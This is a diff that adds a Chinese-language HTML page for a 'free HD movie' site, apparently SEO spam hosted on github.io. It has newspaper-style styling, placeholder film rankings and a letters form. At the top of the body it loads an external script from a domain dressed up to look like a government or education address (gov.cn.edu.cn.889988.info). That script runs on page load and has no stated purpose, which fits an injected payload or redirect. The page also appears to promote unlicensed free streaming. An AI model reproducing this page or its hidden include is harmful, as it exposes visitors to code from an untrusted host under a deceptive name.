@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>爱看福利电影网 - 免费高清电影在线观看</title>
+<meta name="description" content="爱看福利电影网（aikanfulidianyingwang-top）每日精选免费高清电影，电影、电视剧、动漫、纪录片一网打尽，打开即看，福利不断。">
+<meta name="keywords" content="爱看福利电影网, aikanfulidianyingwang-top, 免费电影, 高清影视, 在线观看, 电影电视剧动漫纪录片">
+<meta name="author" content="爱看福利电影网">
+<meta name="robots" content="index, follow">
+<style>
+  *{ margin:0; padding:0; box-sizing:border-box; }
+  :root{
+    --paper:#f4ecd8;
+    --paper2:#efe6cf;
+    --ink:#1c1a17;
+    --ink2:#3d3833;
+    --muted:#6b645a;
+    --rule:#1c1a17;
+    --red:#a8231a;
+    --serif:"Georgia","Times New Roman","Songti SC","SimSun","Microsoft YaHei",serif;
+    --sans:"Helvetica Neue","Arial","Microsoft YaHei",sans-serif;
+  }
+  body{
+    background:var(--paper);
+    color:var(--ink);
+    font-family:var(--serif);
+    line-height:1.75;
+    background-image:
+      repeating-linear-gradient(0deg, rgba(0,0,0,.018) 0 1px, transparent 1px 4px);
+  }
+  .wrap{ max-width:1080px; margin:0 auto; padding:0 22px; }
+
+  /* 报头 */
+  .masthead{ text-align:center; padding:26px 0 18px; border-bottom:4px double var(--rule); }
+  .mast-meta{ display:flex; justify-content:space-between; align-items:center;
+    font-family:var(--sans); font-size:11px; letter-spacing:1px; color:var(--muted);
+    text-transform:uppercase; padding-bottom:12px; border-bottom:1px solid var(--rule); }
+  .mast-name{ font-family:var(--serif); font-weight:900; font-size:clamp(40px,9vw,82px);
+    letter-spacing:2px; line-height:1; margin:16px 0 6px; }
+  .mast-tag{ font-family:var(--sans); font-size:12px; letter-spacing:6px; color:var(--muted);
+    text-transform:uppercase; }
+  .mast-rule{ height:3px; background:var(--ink); margin-top:14px; }
+
+  /* 导航 */
+  nav.top{ margin:10px 0 0; }
+  nav.top ul{ list-style:none; display:flex; flex-wrap:wrap; justify-content:center; gap:0;
+    border-top:1px solid var(--rule); border-bottom:1px solid var(--rule); }
+  nav.top a{ font-family:var(--sans); text-decoration:none; color:var(--ink); font-weight:700;
+    font-size:13px; letter-spacing:1px; padding:9px 16px; border-right:1px solid var(--rule); }
+  nav.top li:last-child a{ border-right:none; }
+  nav.top a:hover{ background:var(--ink); color:var(--paper); }
+
+  /* 头条 */
+  .lede{ padding:34px 0 26px; border-bottom:1px solid var(--rule); }
+  .kicker{ font-family:var(--sans); font-size:11px; letter-spacing:3px; color:var(--red);
+    text-transform:uppercase; font-weight:700; }
+  h1.headline{ font-size:clamp(28px,5.5vw,50px); font-weight:900; line-height:1.15; margin:10px 0; }
+  .dek{ font-style:italic; font-size:17px; color:var(--ink2); max-width:760px; }
+  .byline{ font-family:var(--sans); font-size:12px; color:var(--muted); margin-top:12px;
+    letter-spacing:.5px; }
+  .bodycopy{ margin-top:20px; font-size:16px; }
+  .bodycopy p{ margin-bottom:14px; }
+  .dropcap::first-letter{ font-size:56px; font-weight:900; float:left; line-height:.9;
+    padding:4px 8px 0 0; color:var(--red); }
+  .pull{ font-family:var(--sans); font-weight:800; font-size:18px; color:var(--red);
+    border-left:4px solid var(--red); padding:4px 0 4px 16px; margin:18px 0; }
+
+  /* 栏目 */
+  section.col{ padding:40px 0; border-bottom:1px solid var(--rule); }
+  .col-head{ display:flex; align-items:baseline; justify-content:space-between;
+    border-bottom:3px solid var(--ink); padding-bottom:8px; margin-bottom:24px; }
+  .col-title{ font-size:26px; font-weight:900; letter-spacing:1px; }
+  .col-title small{ font-family:var(--sans); font-size:11px; letter-spacing:2px; color:var(--muted);
+    text-transform:uppercase; margin-left:8px; }
+  .col-more{ font-family:var(--sans); font-size:12px; font-weight:700; letter-spacing:1px;
+    text-decoration:none; color:var(--ink); border-bottom:1px solid var(--ink); }
+
+  /* 影片网格 */
+  .grid{ display:grid; grid-template-columns:repeat(auto-fill,minmax(200px,1fr)); gap:22px; }
+  .film{ border-top:2px solid var(--ink); padding-top:12px; }
+  .frame{ height:235px; border:1px solid var(--ink); display:flex; align-items:center; justify-content:center;
+    font-size:48px; background:var(--paper2); position:relative; }
+  .frame span{ position:absolute; top:6px; left:6px; font-family:var(--sans); font-size:10px;
+    font-weight:700; letter-spacing:1px; background:var(--ink); color:var(--paper); padding:2px 7px; }
+  .film h3{ font-size:17px; font-weight:900; margin:12px 0 4px; }
+  .film .meta{ font-family:var(--sans); font-size:11px; letter-spacing:.5px; color:var(--muted);
+    text-transform:uppercase; }
+  .film p{ font-size:14px; margin-top:8px; color:var(--ink2); }
+
+  /* 排行 */
+  ol.rank{ list-style:none; counter-reset:item; }
+  ol.rank li{ display:flex; gap:16px; align-items:flex-start; padding:14px 0;
+    border-bottom:1px dotted var(--rule); }
+  ol.rank li::before{ counter-increment:item; content:counter(item);
+    font-family:var(--serif); font-weight:900; font-size:30px; line-height:1; color:var(--red);
+    min-width:38px; }
+  ol.rank h4{ font-size:16px; font-weight:900; }
+  ol.rank p{ font-size:13px; color:var(--muted); font-family:var(--sans); }
+
+  /* 分类目录 */
+  .toc{ columns:2; column-gap:40px; }
+  .toc div{ break-inside:avoid; border-bottom:1px dotted var(--rule); padding:10px 0;
+    display:flex; justify-content:space-between; font-family:var(--sans); font-size:14px; font-weight:700; }
+  .toc span{ color:var(--muted); font-weight:400; }
+
+  /* 关于 */
+  .about{ column-count:2; column-gap:40px; font-size:15px; }
+  .about p{ margin-bottom:14px; break-inside:avoid; }
+  .about strong{ color:var(--red); }
+
+  /* 留言 */
+  .form{ max-width:640px; }
+  .form label{ display:block; font-family:var(--sans); font-size:12px; letter-spacing:1px;
+    text-transform:uppercase; font-weight:700; margin:16px 0 5px; }
+  .form input,.form textarea{ width:100%; padding:11px 12px; font:inherit; font-size:15px;
+    background:var(--paper2); border:1px solid var(--ink); color:var(--ink); }
+  .form input:focus,.form textarea:focus{ outline:none; background:var(--paper); }
+  .form button{ margin-top:20px; cursor:pointer; font-family:var(--sans); font-weight:900;
+    letter-spacing:2px; font-size:13px; padding:12px 30px; background:var(--ink); color:var(--paper);
+    border:2px solid var(--ink); }
+  .form button:hover{ background:var(--paper); color:var(--ink); }
+
+  footer{ background:var(--ink); color:var(--paper); padding:36px 0 22px; margin-top:0; }
+  footer .wrap{ border-top:3px solid var(--paper); padding-top:24px; }
+  footer h5{ font-family:var(--serif); font-size:30px; font-weight:900; letter-spacing:2px; }
+  footer p{ font-family:var(--sans); font-size:12px; color:#cdc6b8; margin:6px 0; letter-spacing:.5px; }
+  footer a{ color:var(--paper); }
+  footer .colophon{ font-family:var(--serif); font-style:italic; font-size:12px; color:#a89f90;
+    margin-top:16px; }
+
+  @media (max-width:720px){
+    .toc,.about{ columns:1; }
+    nav.top a{ padding:9px 10px; font-size:12px; }
+    .mast-meta{ flex-direction:column; gap:6px; }
+    .grid{ grid-template-columns:repeat(auto-fill,minmax(150px,1fr)); gap:16px; }
+    .frame{ height:190px; font-size:36px; }
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="masthead">
+  <div class="wrap">
+    <div class="mast-meta">
+      <span>每日电影副刊 · DAILY CINEMA</span>
+      <span id="date">2024 年 10 月</span>
+      <span>第 1 期 · 免费观影</span>
+    </div>
+    <div class="mast-name">爱看福利电影网</div>
+    <div class="mast-tag">免费 · 高清 · 在线观看</div>
+    <div class="mast-rule"></div>
+    <nav class="top">
+      <ul>
+        <li><a href="#home">首页</a></li>
+        <li><a href="#rank">口碑榜</a></li>
+        <li><a href="#grid">影片目录</a></li>
+        <li><a href="#cats">分类索引</a></li>
+        <li><a href="#about">关于本报</a></li>
+        <li><a href="#contact">读者来信</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <article class="lede" id="home">
+    <div class="kicker">今日头条 · HEADLINE</div>
+    <h1 class="headline">爱看福利电影网<br>把免费好片，送上你的银幕</h1>
+    <p class="dek">一份每日更新的电影副刊：不谈资本、不谈票房，只谈你今晚该看哪一部。</p>
+    <div class="byline">记者 · 爱看福利编辑部 ｜ 栏目 · 观影指南</div>
+    <div class="bodycopy">
+      <p class="dropcap">爱看福利电影网（aikanfulidianyingwang-top）相信，好电影不该被藏在层层付费墙后面。从今天起，这里每天为你精选一批真正值得一看的影片：有刚下的新片，也有值得重看的旧作；有让人屏息的类型片，也有让人放松的生活流。全部免费、全部高清、全部打开即看。</p>
+      <div class="pull">“免费不是降低标准，而是把标准交还给观众。”</div>
+      <p>电影的价值不在价格，而在它能否在某个夜晚，准确击中你此刻的心情。这是一份给普通观众的观影指南，也是一份持续更新的片单。</p>
+    </div>
+  </article>
+
+  <section class="col" id="rank">
+    <div class="col-head">
+      <div class="col-title">口碑榜 <small>TOP 5</small></div>
+      <a href="#" class="col-more">完整榜单 →</a>
+    </div>
+    <ol class="rank">
+      <li><div><h4>光年追猎</h4><p>科幻 / 2024 ｜ 9.0 分 ｜ 本周新增</p></div></li>
+      <li><div><h4>密码迷局</h4><p>悬疑 / 2024 ｜ 8.7 分 ｜ 编辑选择</p></div></li>
+      <li><div><h4>深蓝回声</h4><p>纪录片 / 2023 ｜ 9.1 分 ｜ 观众最爱</p></div></li>
+      <li><div><h4>午夜火线</h4><p>动作 / 2024 ｜ 8.4 分 ｜ 周末爽片</p></div></li>
+      <li><div><h4>十七号车站</h4><p>爱情 / 2024 ｜ 8.2 分 ｜ 治愈系</p></div></li>
+    </ol>
+  </section>
+
+  <section class="col" id="grid">
+    <div class="col-head">
+      <div class="col-title">影片目录 <small>FILM LIST</small></div>
+      <a href="#" class="col-more">全部片单 →</a>
+    </div>
+    <div class="grid">
+      <div class="film">
+        <div class="frame"><span>NEW</span>🚀</div>
+        <h3>光年追猎</h3>
+        <div class="meta">科幻 · 2024 · 9.0</div>
+        <p>一段关于追逐与放手的太空故事，视效与情感同时在线。</p>
+      </div>
+      <div class="film">
+        <div class="frame"><span>悬疑</span>🕵️</div>
+        <h3>密码迷局</h3>
+        <div class="meta">悬疑 · 2024 · 8.7</div>
+        <p>层层反转的智力游戏，结尾那个镜头值得反复回味。</p>
+      </div>
+      <div class="film">
+        <div class="frame"><span>纪录</span>🐬</div>
+        <h3>深蓝回声</h3>
+        <div class="meta">纪录片 · 2023 · 9.1</div>
+        <p>用四年时间潜入海洋，记录那些正在消失的声音。</p>
+      </div>
+      <div class="film">
+        <div class="frame"><span>动作</span>🔥</div>
+        <h3>午夜火线</h3>
+        <div class="meta">动作 · 2024 · 8.4</div>
+        <p>干脆利落的动作设计，没有一句废话，只有一场接一场。</p>
+      </div>
+      <div class="film">
+        <div class="frame"><span>爱情</span>🌿</div>
+        <h3>十七号车站</h3>
+        <div class="meta">爱情 · 2024 · 8.2</div>
+        <p>两个陌生人在一座小车站相遇，然后各自继续生活。</p>
+      </div>
+      <div class="film">
+        <div class="frame"><span>喜剧</span>🎤</div>
+        <h3>爆笑直播</h3>
+        <div class="meta">喜剧 · 2023 · 7.9</div>
+        <p>一场失控的直播，一群失控的人，笑点密集但不吵。</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="col" id="cats">
+    <div class="col-head">
+      <div class="col-title">分类索引 <small>INDEX</small></div>
+    </div>
+    <div class="toc">
+      <div><span>动作片</span><span>1,240 部</span></div>
+      <div><span>科幻片</span><span>856 部</span></div>
+      <div><span>悬疑片</span><span>632 部</span></div>
+      <div><span>爱情片</span><span>1,580 部</span></div>
+      <div><span>动画片</span><span>420 部</span></div>
+      <div><span>纪录片</span><span>310 部</span></div>
+      <div><span>恐怖片</span><span>540 部</span></div>
+      <div><span>战争片</span><span>188 部</span></div>
+    </div>
+  </section>
+
+  <section class="col" id="about">
+    <div class="col-head">
+      <div class="col-title">关于本报 <small>EDITORIAL</small></div>
+    </div>
+    <div class="about">
+      <p><strong>爱看福利电影网</strong>（aikanfulidianyingwang-top）是一份只谈电影的“副刊”。我们相信，观影是一种日常权利，不该被复杂的付费流程打断。</p>
+      <p>官网：<strong>https://aikanfulidianyingwang-top.github.io</strong> —— 建议收藏，每晚来翻一翻今天的片单。</p>
+      <p>我们的编辑部由几位普通影迷组成，每天的工作只有一件：从海量片源里，挑出那些值得你花两小时的。我们不强推热门，也不迎合算法，只按“今晚你会不会想看”这一条标准来选。</p>
+      <p>电影是免费的，但好电影不是廉价的。这是我们的立场，也是这份副刊的全部野心。</p>
+    </div>
+  </section>
+
+  <section class="col" id="contact">
+    <div class="col-head">
+      <div class="col-title">读者来信 <small>LETTERS</small></div>
+    </div>
+    <div class="form">
+      <label>署名</label>
+      <input type="text" placeholder="读者姓名">
+      <label>邮箱（选填）</label>
+      <input type="email" placeholder="your@mail.com">
+      <label>来信内容</label>
+      <textarea rows="5" placeholder="推荐一部你反复看的电影，或告诉我们你想看的类型……"></textarea>
+      <button onclick="alert('来信已收到！静态演示页，部署后可接后端处理 📮')">寄出信件</button>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <h5>爱看福利电影网</h5>
+    <p>免费 · 高清 · 在线观看 ｜ 每日更新片单</p>
+    <p>网址：<a href="https://aikanfulidianyingwang-top.github.io">https://aikanfulidianyingwang-top.github.io</a></p>
+    <p class="colophon">本页由爱看福利编辑部编排，采用衬线印刷排版风格 · 所有栏目链接以 # 占位</p>
+  </div>
+</footer>
+
+<script>
+  document.querySelectorAll('a[href^="#"]').forEach(function(a){
+    a.addEventListener('click', function(e){
+      var id = this.getAttribute('href');
+      if(id.length > 1){
+        e.preventDefault();
+        var el = document.querySelector(id);
+        if(el) el.scrollIntoView({behavior:'smooth', block:'start'});
+      }
+    });
+  });
+  var d = new Date();
+  var y = d.getFullYear(), m = d.getMonth()+1;
+  document.getElementById('date').textContent = y + ' 年 ' + m + ' 月';
+</script>
+</body>
+</html>
